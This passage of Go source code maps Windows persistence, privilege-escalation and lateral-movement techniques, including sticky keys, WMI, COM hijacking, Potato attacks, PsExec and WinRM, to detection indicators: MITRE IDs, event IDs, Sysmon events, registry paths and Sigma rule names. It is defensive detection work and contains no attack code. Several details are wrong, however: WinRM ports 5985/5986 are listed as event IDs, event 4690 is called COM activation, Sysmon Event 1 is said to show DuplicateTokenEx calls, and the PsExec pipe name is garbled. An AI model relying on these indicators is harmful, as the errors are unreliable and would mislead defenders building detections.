			{Category: ArtifactWindowsEventLog, Description: "Registry change to IFEO key", Location: "Event ID 4657 on HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\", Severity: "high", Notes: "New IFEO subkey or Debugger value added", SigmaRule: "win_ifeo_debugger_persistence"},
			{Category: ArtifactSysmon, Description: "IFEO registry key modification", Location: "Sysmon Event ID 13 (RegistryEvent Value Set) on IFEO path", Severity: "high", Notes: "Debugger value set for system executable"},
			{Category: ArtifactWindowsRegistry, Description: "IFEO Debugger value", Location: "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<target>.exe\\Debugger", Severity: "high", Notes: "GlobalFlag and Debugger values both required"},
		},
	}

	m["P5"] = TechniqueArtifact{
		TechniqueID:    "P5",
		TechniqueName:  "Sticky Keys Backdoor",
		Package:        "persistence",
		Phase:          PhasePersistence,
		MITREID:        "T1546.008",
		MITRETechnique: "Event Triggered Execution: Accessibility Features",
		DetectionEase:  "easy",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactFileSystem, Description: "sethc.exe replaced with cmd.exe or backdoor", Location: "C:\\Windows\\System32\\sethc.exe (modified file)", Severity: "critical", Notes: "File size or hash mismatch compared to known good", SigmaRule: "win_sticky_keys_sethc_replacement"},
			{Category: ArtifactSysmon, Description: "File overwrite of accessibility binary", Location: "Sysmon Event ID 11 (FileCreate) or Event ID 1", Severity: "high", Notes: "Overwrite of sethc.exe, utilman.exe, osk.exe, magnify.exe", SigmaRule: "sysmon_accessibility_replacement"},
			{Category: ArtifactWindowsEventLog, Description: "Registry modification for accessibility", Location: "Event ID 4657 on HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility", Severity: "high", Notes: "Debugger value set under accessibility session"},
			{Category: ArtifactWindowsRegistry, Description: "Accessibility executable replacement", Location: "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger", Severity: "critical", Notes: "Also check utilman.exe, narrator.exe, magnify.exe, osk.exe, DisplaySwitch.exe"},
		},
	}

	m["P6"] = TechniqueArtifact{
		TechniqueID:    "P6",
		TechniqueName:  "Scheduled Tasks",
		Package:        "persistence",
		Phase:          PhasePersistence,
		MITREID:        "T1053.005",
		MITRETechnique: "Scheduled Task/Job: Scheduled Task",
		DetectionEase:  "easy",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Scheduled task created", Location: "Event ID 4698 (Task Scheduler) with XML task definition", Severity: "high", Notes: "Look for tasks with SYSTEM privileges running off-box binaries", SigmaRule: "win_scheduled_task_creation"},
			{Category: ArtifactWindowsEventLog, Description: "Scheduled task deleted", Location: "Event ID 4699", Severity: "medium", Notes: "Task deletion may indicate cleanup after execution"},
			{Category: ArtifactWindowsEventLog, Description: "Scheduled task enabled", Location: "Event ID 4700", Severity: "medium", Notes: "Previously disabled task enabled"},
			{Category: ArtifactWindowsEventLog, Description: "Scheduled task disabled", Location: "Event ID 4701", Severity: "low", Notes: "May precede deletion for cleanup"},
			{Category: ArtifactFileSystem, Description: "Task XML file in Tasks directory", Location: "C:\\Windows\\System32\\Tasks\\*.job / XML", Severity: "high", Notes: "Inspect task XML for Command, Arguments, and UserId fields"},
			{Category: ArtifactSysmon, Description: "Task scheduler process creation", Location: "Sysmon Event ID 1 (schtasks.exe or svchost.exe taskeng)", Severity: "medium", Notes: "Correlate with Event ID 4698"},
		},
	}

	m["P7"] = TechniqueArtifact{
		TechniqueID:    "P7",
		TechniqueName:  "WMI Persistence",
		Package:        "persistence",
		Phase:          PhasePersistence,
		MITREID:        "T1546.003",
		MITRETechnique: "Event Triggered Execution: Windows Management Instrumentation",
		DetectionEase:  "hard",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "WMI filter or consumer created", Location: "Event ID 5861 (WMI-Activity) for __EventFilter, __EventConsumer", Severity: "high", Notes: "Permanent WMI event subscription created", SigmaRule: "win_wmi_persistence"},
			{Category: ArtifactWindowsEventLog, Description: "WMI filter to consumer binding", Location: "Event ID 5859 (WMI-Activity)", Severity: "high", Notes: "FilterConsumerBinding indicates active WMI subscription"},
			{Category: ArtifactWindowsEventLog, Description: "WMI consumer activity", Location: "Event ID 5860 (WMI-Activity)", Severity: "medium", Notes: "ActiveConsumer indicates triggered WMI persistence"},
			{Category: ArtifactSysmon, Description: "WMI consumer creation", Location: "Sysmon Event ID 19 (WmiEventFilter), 20 (WmiEventConsumer), 21 (WmiFilterConsumerBinding)", Severity: "critical", Notes: "Sysmon provides full visibility into WMI subscriptions", SigmaRule: "sysmon_wmi_persistence"},
			{Category: ArtifactFileSystem, Description: "WMI repository MOF file", Location: "C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA", Severity: "medium", Notes: "Can extract WMI persistence artifacts from repository"},
		},
	}

	m["P8"] = TechniqueArtifact{
		TechniqueID:    "P8",
		TechniqueName:  "GPO Injection",
		Package:        "persistence",
		Phase:          PhasePersistence,
		MITREID:        "T1484.001",
		MITRETechnique: "Domain Policy Modification: Group Policy Modification",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "SYSVOL file modification", Location: "Event ID 5136 (Directory Service Change) on CN=Policies,CN=System", Severity: "critical", Notes: "GPO file modified in SYSVOL by non-DC machine", SigmaRule: "win_gpo_modification_sysvol"},
			{Category: ArtifactWindowsEventLog, Description: "Group Policy file access", Location: "Event ID 5140 (File Share Access) on SYSVOL share", Severity: "high", Notes: "Write access to SYSVOL from unexpected source"},
			{Category: ArtifactFileSystem, Description: "Modified GPO script in SYSVOL", Location: "\\\\<DC>\\SYSVOL\\<domain>\\Policies\\{GUID}\\Machine\\Scripts\\", Severity: "critical", Notes: "Startup/shutdown scripts or registry.pol file tampered"},
			{Category: ArtifactNetwork, Description: "SMB write to SYSVOL share", Location: "Network traffic: SMB2 write to SYSVOL share", Severity: "high", Notes: "Non-DC machine writing to domain SYSVOL export"},
		},
	}

	m["P9"] = TechniqueArtifact{
		TechniqueID:    "P9",
		TechniqueName:  "COM Hijacking",
		Package:        "persistence",
		Phase:          PhasePersistence,
		MITREID:        "T1546.015",
		MITRETechnique: "Event Triggered Execution: Component Object Model Hijacking",
		DetectionEase:  "hard",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "CLSID registry modification", Location: "Event ID 4657 on HKCR\\CLSID\\{GUID}\\InprocServer32 or LocalServer32", Severity: "high", Notes: "COM class registration modified to point to arbitrary DLL", SigmaRule: "win_com_hijacking_registry"},
			{Category: ArtifactSysmon, Description: "Image load from COM hijacked path", Location: "Sysmon Event ID 7 (Image Loaded) from unusual CLSID path", Severity: "high", Notes: "DLL loaded via modified COM registration"},
			{Category: ArtifactSysmon, Description: "Registry key value modified in CLSID", Location: "Sysmon Event ID 12, 13 (RegistryEvent)", Severity: "high", Notes: "TreatInproc32 or LocalServer32 value changed"},
			{Category: ArtifactWindowsRegistry, Description: "Hijacked CLSID key", Location: "HKCR\\CLSID\\{GUID}\\InprocServer32\\(Default) or HKCU\\Software\\Classes\\CLSID\\{GUID}", Severity: "high", Notes: "User scope CLSID hijack often used as it doesn't require admin"},
		},
	}

	m["P10"] = TechniqueArtifact{
		TechniqueID:    "P10",
		TechniqueName:  "DLL Search Order Hijacking",
		Package:        "persistence",
		Phase:          PhasePersistence,
		MITREID:        "T1574.001",
		MITRETechnique: "Hijack Execution Flow: DLL Search Order Hijacking",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactSysmon, Description: "Image loaded from unusual search path", Location: "Sysmon Event ID 7 (Image Loaded) from user-writable path", Severity: "high", Notes: "DLL loaded from %TEMP%, %APPDATA%, or current directory", SigmaRule: "sysmon_dll_search_order_hijack"},
			{Category: ArtifactWindowsEventLog, Description: "Process creation from hijacked DLL load", Location: "Event ID 4688 with known vulnerable binary", Severity: "medium", Notes: "winword.exe, excel.exe, or other trusted binaries loading malicious DLL"},
			{Category: ArtifactSysmon, Description: "DLL load side-by-side from non-standard path", Location: "Sysmon Event ID 7 with path containing subversion pattern", Severity: "high", Notes: "e.g. legitimate.exe loading myevil.dll from app-local directory"},
			{Category: ArtifactFileSystem, Description: "DLL planted in search order location", Location: "User-writable directory with missing DLL name", Severity: "high", Notes: "Check for DLLs in %TEMP% that match known system DLL names"},
		},
	}

	m["P11"] = TechniqueArtifact{
		TechniqueID:    "P11",
		TechniqueName:  "Service Persistence",
		Package:        "persistence",
		Phase:          PhasePersistence,
		MITREID:        "T1543.003",
		MITRETechnique: "Create or Modify System Process: Windows Service",
		DetectionEase:  "easy",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Service installed on system", Location: "Event ID 7045 (System Event Log) — new service installed", Severity: "high", Notes: "Service with ImagePath pointing to non-standard location", SigmaRule: "win_service_creation"},
			{Category: ArtifactWindowsEventLog, Description: "Service creation via Security log", Location: "Event ID 4697 (Security) — service installed", Severity: "high", Notes: "ServiceInstall event with service account and binary path"},
			{Category: ArtifactWindowsRegistry, Description: "Service entry in registry", Location: "HKLM\\System\\CurrentControlSet\\Services\\<ServiceName>\\ImagePath", Severity: "high", Notes: "Service binary and startup type configurable via registry"},
			{Category: ArtifactSysmon, Description: "Service process creation", Location: "Sysmon Event ID 1 (Process creation) by services.exe", Severity: "medium", Notes: "Monitor services.exe spawning new processes"},
		},
	}

	m["U1"] = TechniqueArtifact{
		TechniqueID:    "U1",
		TechniqueName:  "Potato Attacks",
		Package:        "privesc",
		Phase:          PhasePrivilegeEscalation,
		MITREID:        "T1134.002",
		MITRETechnique: "Access Token Manipulation: Create Process with Token",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactSysmon, Description: "DCOM network connection", Location: "Sysmon Event ID 3 (Network Connection) to localhost on high ports", Severity: "high", Notes: "Potato variants trigger DCOM to local system for token capture", SigmaRule: "sysmon_potato_dcom_connection"},
			{Category: ArtifactSysmon, Description: "Named pipe creation by Potato variant", Location: "Sysmon Event ID 17 (Pipe Created) and 18 (Pipe Connected)", Severity: "high", Notes: "Named pipe used in token impersonation chain", SigmaRule: "sysmon_named_pipe_potato"},
			{Category: ArtifactSysmon, Description: "Process with SeImpersonatePrivilege spawning child", Location: "Sysmon Event ID 1 with TokenElevationType 2 (Full)", Severity: "high", Notes: "Service account with SeImpersonatePrivilege spawns SYSTEM process"},
			{Category: ArtifactWindowsEventLog, Description: "Service account logon with special privileges", Location: "Event ID 4672 with SeImpersonatePrivilege", Severity: "high", Notes: "Check for IIS/IUSR, MSSQL, or NETWORK SERVICE accounts"},
		},
	}

	m["U2"] = TechniqueArtifact{
		TechniqueID:    "U2",
		TechniqueName:  "UAC Bypass",
		Package:        "privesc",
		Phase:          PhasePrivilegeEscalation,
		MITREID:        "T1548.002",
		MITRETechnique: "Abuse Elevation Control Mechanism: Bypass User Account Control",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Registry modification to HKCU Software Classes", Location: "Event ID 4657 on HKCU\\Software\\Classes\\*, especially MS-Settings or shell\\(open|runas)", Severity: "high", Notes: "UAC bypass via registry reflection with fodhelper.exe or computerdefaults.exe", SigmaRule: "win_uac_bypass_registry"},
			{Category: ArtifactWindowsEventLog, Description: "COM activation for UAC bypass", Location: "Event ID 4690 (COM Activation) with elevated CLSID", Severity: "high", Notes: "Elevation via IActiveUIManager or CMSTPLUA", SigmaRule: "win_uac_bypass_com_activation"},
			{Category: ArtifactSysmon, Description: "Process creation from UAC bypass chain", Location: "Sysmon Event ID 1 with parent as fodhelper.exe, computerdefaults.exe, or sdclt.exe", Severity: "high", Notes: "Low-integrity process spawning high-integrity child via auto-elevate"},
			{Category: ArtifactWindowsRegistry, Description: "UAC bypass registry key", Location: "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command", Severity: "high", Notes: "DelegateExecute value points to bypass payload"},
		},
	}

	m["U3"] = TechniqueArtifact{
		TechniqueID:    "U3",
		TechniqueName:  "Unquoted Service Path",
		Package:        "privesc",
		Phase:          PhasePrivilegeEscalation,
		MITREID:        "T1543.003",
		MITRETechnique: "Create or Modify System Process: Windows Service",
		DetectionEase:  "easy",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Service creation with unquoted path", Location: "Event ID 7045 with ImagePath containing spaces and no quotes", Severity: "high", Notes: "Service binary path like C:\\Program Files\\My App\\service.exe (no quotes)", SigmaRule: "win_unquoted_service_path"},
			{Category: ArtifactFileSystem, Description: "DLL planted in service path component", Location: "C:\\Program Files\\My.exe or any space-split path segment", Severity: "high", Notes: "Attacker plants executable named after first word of path segment"},
			{Category: ArtifactWindowsRegistry, Description: "Service ImagePath with unquoted space", Location: "HKLM\\System\\CurrentControlSet\\Services\\<ServiceName>\\ImagePath", Severity: "high", Notes: "Check for absence of quotes around path with spaces"},
		},
	}

	m["U4"] = TechniqueArtifact{
		TechniqueID:    "U4",
		TechniqueName:  "Token Stealing",
		Package:        "privesc",
		Phase:          PhasePrivilegeEscalation,
		MITREID:        "T1134.001",
		MITRETechnique: "Access Token Manipulation: Token Impersonation/Theft",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Process creation with TokenSid for elevated impersonation", Location: "Event ID 4688 with TokenSid indicating SYSTEM or domain admin", Severity: "critical", Notes: "Non-elevated process spawns child with high-integrity token", SigmaRule: "win_token_stealing_process"},
			{Category: ArtifactSysmon, Description: "Process opened with TOKEN_DUPLICATE or TOKEN_IMPERSONATE", Location: "Sysmon Event ID 8 (CreateRemoteThread) or 10 (ProcessAccess)", Severity: "high", Notes: "Handle opened with TOKEN_DUPLICATE (0x0002) or TOKEN_IMPERSONATE (0x0004)"},
			{Category: ArtifactSysmon, Description: "DuplicateTokenEx call observed", Location: "Sysmon Event ID 1 calling DuplicateTokenEx", Severity: "high", Notes: "Indicates token duplication for impersonation"},
			{Category: ArtifactWindowsEventLog, Description: "Privilege use for token operations", Location: "Event ID 4672 with SeAssignPrimaryTokenPrivilege or SeIncreaseQuotaPrivilege", Severity: "high", Notes: "Privileged operations enabling token theft"},
		},
	}

	m["L1"] = TechniqueArtifact{
		TechniqueID:    "L1",
		TechniqueName:  "DCOM Lateral Movement",
		Package:        "lateralmovement",
		Phase:          PhaseLateralMovement,
		MITREID:        "T1021.003",
		MITRETechnique: "Remote Services: Distributed Component Object Model",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactSysmon, Description: "DCOM network connection to remote host", Location: "Sysmon Event ID 3 (Network Connection) to port 135/tcp", Severity: "high", Notes: "DCOM init connection to remote endpoint mapper", SigmaRule: "sysmon_dcom_connection"},
			{Category: ArtifactWindowsEventLog, Description: "COM object activation for DCOM", Location: "Event ID 4690 (COM Activation) for MMC, Excel, ShellBrowserWindow", Severity: "high", Notes: "Activation of COM object on remote system", SigmaRule: "win_dcom_activation"},
			{Category: ArtifactWindowsEventLog, Description: "DCOM object instantiation", Location: "Event ID 4648 (Explicit Credential) for DCOM session", Severity: "medium", Notes: "Logon type 3 for DCOM session with explicit credentials"},
			{Category: ArtifactNetwork, Description: "DCE/RPC on port 135 with DCOM UUID", Location: "Network traffic: DCE/RPC with uuid 000001a0-0000-0000-c000-000000000046", Severity: "high", Notes: "IOXIDResolver or DCOM activator protocol"},
		},
	}

	m["L2"] = TechniqueArtifact{
		TechniqueID:    "L2",
		TechniqueName:  "PsExec",
		Package:        "lateralmovement",
		Phase:          PhaseLateralMovement,
		MITREID:        "T1021.002",
		MITRETechnique: "Remote Services: SMB/Admin Share",
		DetectionEase:  "easy",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Service created by PsExec", Location: "Event ID 7045 with ImagePath containing PSEXESVC or target binary", Severity: "high", Notes: "Service named PSEXESVC remotely installed", SigmaRule: "win_psexec_service_creation"},
			{Category: ArtifactWindowsEventLog, Description: "Process created via remote service", Location: "Event ID 4688 (Process Creation) from services.exe", Severity: "high", Notes: "Process spawned via PsExec service on target"},
			{Category: ArtifactSysmon, Description: "ADMIN$ file write by PsExec", Location: "Sysmon Event ID 11 (FileCreate) on ADMIN$ share", Severity: "high", Notes: "PSEXESVC.exe binary written to ADMIN$", SigmaRule: "sysmon_psexec_file_write"},
			{Category: ArtifactNetwork, Description: "SMB connection to ADMIN$ or IPC$", Location: "Network traffic: SMB2 to ADMIN$ share for service binary upload", Severity: "high", Notes: "Named pipe \\pipe\\ntsvs used for service control"},
			{Category: ArtifactWindowsEventLog, Description: "Network logon with administrative session", Location: "Event ID 4624 LogonType 3 (Network) with admin privileges", Severity: "medium", Notes: "Admin user network logon to target system"},
		},
	}

	m["L3"] = TechniqueArtifact{
		TechniqueID:    "L3",
		TechniqueName:  "WMI Lateral Movement",
		Package:        "lateralmovement",
		Phase:          PhaseLateralMovement,
		MITREID:        "T1047",
		MITRETechnique: "Windows Management Instrumentation",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "WMI process creation on remote system", Location: "Event ID 5858 (WMI-Activity) with event type 0x8001", Severity: "high", Notes: "Win32_Process.Create via WMI on remote host", SigmaRule: "win_wmi_remote_process"},
			{Category: ArtifactWindowsEventLog, Description: "WMI consumer triggered from remote", Location: "Event ID 5860 (WMI-Activity)", Severity: "high", Notes: "ActiveConsumer indicates command execution via WMI"},
			{Category: ArtifactWindowsEventLog, Description: "WMI filter binding created", Location: "Event ID 5861 (WMI-Activity)", Severity: "high", Notes: "Temporary WMI subscription for remote execution"},
			{Category: ArtifactSysmon, Description: "WMI event filter creation", Location: "Sysmon Event ID 19 (WmiEventFilter)", Severity: "critical", Notes: "WMI filter triggered for remote execution"},
			{Category: ArtifactSysmon, Description: "WMI consumer process creation", Location: "Sysmon Event ID 1 with parent as WmiPrvSE.exe", Severity: "high", Notes: "WmiPrvSE.exe spawning cmd.exe or powershell.exe", SigmaRule: "sysmon_wmi_process_creation"},
			{Category: ArtifactNetwork, Description: "WMI DCOM or WinRM connection", Location: "Network traffic: DCOM (135/tcp) or WinRM (5985/tcp, 5986/tcp) for WMI", Severity: "high", Notes: "WMI uses DCOM by default; configure firewall to restrict"},
		},
	}

	m["L4"] = TechniqueArtifact{
		TechniqueID:    "L4",
		TechniqueName:  "WinRM Lateral Movement",
		Package:        "lateralmovement",
		Phase:          PhaseLateralMovement,
		MITREID:        "T1021.006",
		MITRETechnique: "Remote Services: Windows Remote Management",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "PowerShell remoting session", Location: "Event ID 4104 (PowerShell Scriptblock) with Invoke-Command or Enter-PSSession", Severity: "high", Notes: "PowerShell remote session execution", SigmaRule: "win_winrm_powershell_remoting"},
			{Category: ArtifactWindowsEventLog, Description: "WinRM listener activity", Location: "Event ID 5985 (WinRM HTTP) or 5986 (WinRM HTTPS) logon", Severity: "high", Notes: "WinRM service accessed with authentication"},
			{Category: ArtifactWindowsEventLog, Description: "Explicit credential used for WinRM", Location: "Event ID 4648 (Explicit Credential) with logon type 3", Severity: "medium", Notes: "Credentials passed to remote WinRM host"},
			{Category: ArtifactNetwork, Description: "WinRM HTTP/HTTPS traffic", Location: "Network traffic to port 5985/tcp or 5986/tcp", Severity: "high", Notes: "WSMan protocol enumeration and command execution"},
		},
	}

	m["L5"] = TechniqueArtifact{
		TechniqueID:    "L5",
		TechniqueName:  "RDP Lateral Movement",
		Package:        "lateralmovement",
		Phase:          PhaseLateralMovement,
		MITREID:        "T1021.001",
		MITRETechnique: "Remote Services: Remote Desktop Protocol",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Remote interactive logon via RDP", Location: "Event ID 4624 logon type 10 (RemoteInteractive)", Severity: "high", Notes: "Remote desktop logon from unknown IP or non-standard time", SigmaRule: "win_rdp_remote_logon"},
			{Category: ArtifactWindowsEventLog, Description: "RDP connection successful", Location: "Event ID 1149 (TerminalServices-RemoteConnectionManager) with source IP", Severity: "high", Notes: "RDP session established from external or anomalous IP"},
			{Category: ArtifactWindowsEventLog, Description: "RDP authentication attempt", Location: "Event ID 4625 (Failed Logon) LogonType 10", Severity: "medium", Notes: "Brute-force RDP attempts from same source IP"},
			{Category: ArtifactNetwork, Description: "RDP protocol connection", Location: "Network traffic to port 3389/tcp", Severity: "medium", Notes: "RDP handshake with SSL/TLS negotiation"},
			{Category: ArtifactWindowsRegistry, Description: "RDP listener configuration", Location: "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections", Severity: "low", Notes: "RDP enabled (0) via registry modification"},
		},
	}

	m["L6"] = TechniqueArtifact{
		TechniqueID:    "L6",
		TechniqueName:  "SCCM Lateral Movement",
		Package:        "lateralmovement",
		Phase:          PhaseLateralMovement,
		MITREID:        "T1021",
		MITRETechnique: "Remote Services",
		DetectionEase:  "hard",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "CCM_Program execution request", Location: "Event ID 4688 with CCM_Program or ccmexec client", Severity: "high", Notes: "SCCM client executing software distribution program", SigmaRule: "win_sccm_program_execution"},
			{Category: ArtifactNetwork, Description: "Network traffic to SCCM server", Location: "Network traffic to port 4022/tcp or 10123/tcp (CCM HTTP/S)", Severity: "high", Notes: "SCCM client-server management point communication"},
			{Category: ArtifactWindowsEventLog, Description: "SCCM logon events with admin context", Location: "Event ID 4624 logon type 3 (Network) with SCCM machine account", Severity: "medium", Notes: "SCCM client logon to distribute or execute payload"},
			{Category: ArtifactFileSystem, Description: "CCM cache with staged payloads", Location: "C:\\Windows\\CCMCache\\* with recent executable additions", Severity: "high", Notes: "SCCM caches deployed packages locally for execution"},
		},
	}

	m["L7"] = TechniqueArtifact{
		TechniqueID:    "L7",
		TechniqueName:  "Remote Scheduled Tasks",
		Package:        "lateralmovement",
		Phase:          PhaseLateralMovement,
		MITREID:        "T1053.005",
		MITRETechnique: "Scheduled Task/Job: Scheduled Task",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Scheduled task created on remote machine", Location: "Event ID 4698 on target system with remote source", Severity: "high", Notes: "schtasks.exe /CREATE /S remote_host", SigmaRule: "win_remote_scheduled_task_creation"},
			{Category: ArtifactSysmon, Description: "File written by remote task creation", Location: "Sysmon Event ID 11 (FileCreate) in Tasks directory", Severity: "high", Notes: "Task XML/JOB file written from remote schtasks.exe"},
			{Category: ArtifactNetwork, Description: "RPC task scheduler service", Location: "Network traffic to port 135/tcp (RPC) or 49154/tcp (Task Scheduler)", Severity: "high", Notes: "ITaskSchedulerService RPC to remote machine"},
		},
	}

	m["L8"] = TechniqueArtifact{
		TechniqueID:    "L8",
		TechniqueName:  "Remote Service Installation",
		Package:        "lateralmovement",
		Phase:          PhaseLateralMovement,
		MITREID:        "T1543.003",
		MITRETechnique: "Create or Modify System Process: Windows Service",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Service created on remote machine", Location: "Event ID 7045 on target system from remote source", Severity: "high", Notes: "sc.exe \\\\remote create or PowerShell New-Service -ComputerName", SigmaRule: "win_remote_service_installation"},
			{Category: ArtifactWindowsEventLog, Description: "Remote service management activity", Location: "Event ID 4697 (Security) with service start type auto", Severity: "high", Notes: "Service set to auto-start for persistence across reboot"},
			{Category: ArtifactNetwork, Description: "SVCCTL named pipe connection", Location: "Network traffic: SMB named pipe \\pipe\\svcctl for remote service control", Severity: "high", Notes: "Service Control Manager RPC over SMB"},
		},
	}

	return m
}
